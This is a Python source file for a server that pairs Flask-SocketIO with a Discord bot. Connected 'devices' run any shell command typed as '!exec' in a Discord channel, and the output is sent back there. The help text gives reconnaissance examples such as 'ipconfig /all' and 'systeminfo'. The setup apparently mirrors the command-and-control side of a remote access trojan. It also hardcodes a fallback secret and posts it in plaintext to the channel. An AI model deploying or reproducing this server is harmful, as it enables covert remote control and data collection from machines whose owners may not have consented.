import os
import threading
import time
import subprocess
import json
import sys
from datetime import datetime
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, disconnect
import discord
from discord.ext import commands

# ================== Fix for audioop ==================
if not hasattr(sys, 'modules'):
    sys.modules['audioop'] = None

# ================== Environment Variables ==================
DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN')
CHANNEL_ID = int(os.environ.get('CHANNEL_ID', 0))
SERVER_SECRET = os.environ.get('SERVER_SECRET', 'ZWwj6kJb433GKbP')

if not DISCORD_TOKEN or not CHANNEL_ID:
    print("❌ Missing DISCORD_TOKEN or CHANNEL_ID")
    exit(1)

print(f"✅ Loaded: CHANNEL_ID={CHANNEL_ID}")

# ================== Flask Setup ==================
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'secret')

# ================== SocketIO with threading mode ==================
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='threading',  # تغيير إلى threading
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=1000000
)

# ================== Global Variables with Lock ==================
connected_clients = {}      # name -> {sid, ip, authenticated}
client_responses = {}       # command_id -> result
failed_attempts = {}        # ip -> count
response_lock = threading.Lock()  # قفل لتنظيم الوصول

# ================== WebSocket Events ==================
@socketio.on('connect')
def handle_connect():
    print(f"[+] Client connected: {request.sid} from {request.remote_addr}")
    emit('request_auth', {'message': 'Send token'})

@socketio.on('authenticate')
def handle_auth(data):
    token = data.get('token', '')
    name = data.get('name', 'Unknown')
    ip = request.remote_addr

    if token == SERVER_SECRET:
        connected_clients[name] = {
            'sid': request.sid,
            'ip': ip,
            'authenticated': True,
            'connected_at': datetime.now().isoformat()
        }
        print(f"[✅] Authenticated: {name} from {ip}")
        emit('auth_success', {'message': f'Welcome {name}'})
        if ip in failed_attempts:
            del failed_attempts[ip]
    else:
        print(f"[❌] Auth failed: {name} from {ip}")
        failed_attempts[ip] = failed_attempts.get(ip, 0) + 1
        if failed_attempts[ip] >= 5:
            emit('auth_failed', {'message': 'Blocked - Too many attempts'})
            # التعديل: استخدام disconnect من socketio
            disconnect(request.sid)
        else:
            emit('auth_failed', {'message': f'Wrong token ({failed_attempts[ip]}/5)'})

@socketio.on('command_result')
def handle_result(data):
    name = data.get('client_name')
    if name not in connected_clients or not connected_clients[name]['authenticated']:
        return
    cmd_id = data.get('command_id')
    result = data.get('result')
    
    with response_lock:
        client_responses[cmd_id] = result
    
    print(f"[+] Result from {name} (ID: {cmd_id})")

@socketio.on('disconnect')
def handle_disconnect():
    for name, info in list(connected_clients.items()):
        if info['sid'] == request.sid:
            del connected_clients[name]
            print(f"[-] {name} disconnected")
            break

# ================== Discord Bot ==================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'[+] Bot online as {bot.user}')
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send("🖥️ **Server Ready!**")
        await channel.send(f"🔑 **Auth Token:** `{SERVER_SECRET}`")
        await channel.send(f"📋 **Commands:**\n`!list` - Show devices\n`!exec <device> <command>` - Execute command\n`!help` - Show help")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.channel.id != CHANNEL_ID:
        return

    content = message.content.strip()
    if not content:
        return

    if content.startswith('!exec'):
        parts = content.split(maxsplit=2)
        if len(parts) < 3:
            await message.channel.send("⚠️ Use: `!exec <device> <command>`")
            return

        _, device, cmd = parts
        
        if device not in connected_clients:
            await message.channel.send(f"❌ Device **{device}** not connected")
            return
        if not connected_clients[device]['authenticated']:
            await message.channel.send(f"❌ Device **{device}** not authenticated")
            return

        cmd_id = f"{device}_{datetime.now().timestamp()}"
        sid = connected_clients[device]['sid']
        
        try:
            # إرسال الأمر
            socketio.emit('execute_command', {
                'command': cmd,
                'command_id': cmd_id
            }, room=sid)
            
            # انتظار النتيجة (60 ثانية)
            start_time = time.time()
            result = None
            
            while time.time() - start_time < 60:
                with response_lock:
                    result = client_responses.pop(cmd_id, None)
                if result is not None:
                    break
                time.sleep(1)
            
            if result is None:
                result = "⏰ Timeout (60 seconds)"
            
            # تقصير النتيجة إذا كانت طويلة
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            
            await message.channel.send(f"💻 **{device}** => `{cmd}`\n```\n{result}\n```")
            
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    elif content == '!list':
        if not connected_clients:
            await message.channel.send("❌ No devices connected")
            return
        devices = "\n".join([f"- {name}" for name in connected_clients])
        await message.channel.send(f"📱 **Connected Devices:**\n{devices}")

    elif content == '!help':
        await message.channel.send("""
**📋 Available Commands:**
`!list` - Show connected devices
`!exec <device> <command>` - Execute command on device
`!ping` - Check bot status
`!help` - Show this help

**Examples:**
`!exec MY-PC dir`
`!exec MY-PC ipconfig /all`
`!exec MY-PC systeminfo`
        """)

    elif content == '!ping':
        await message.channel.send("🏓 Pong!")

# ================== Routes ==================
@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'clients': len(connected_clients),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/status')
def status():
    return jsonify({
        'clients': list(connected_clients.keys()),
        'total': len(connected_clients),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'}), 200

# ================== Main ==================
def run_bot():
    try:
        bot.run(DISCORD_TOKEN)
    except Exception as e:
        print(f"❌ Bot error: {e}")

if __name__ == '__main__':
    print("="*60)
    print("🚀 Remote Server v2.0")
    print("="*60)
    print(f"🔑 Secret: {SERVER_SECRET}")
    print(f"📡 Starting server...")
    print("="*60)
    
    # تشغيل بوت الديسكورد في خيط منفصل
    t = threading.Thread(target=run_bot, daemon=True)
    t.start()
    time.sleep(2)  # انتظار بدء البوت
    
    # تشغيل السيرفر
    port = int(os.environ.get('PORT', 5000))
    socketio.run(
        app,
        host='0.0.0.0',
        port=port,
        debug=False,
        allow_unsafe_werkzeug=True
    )
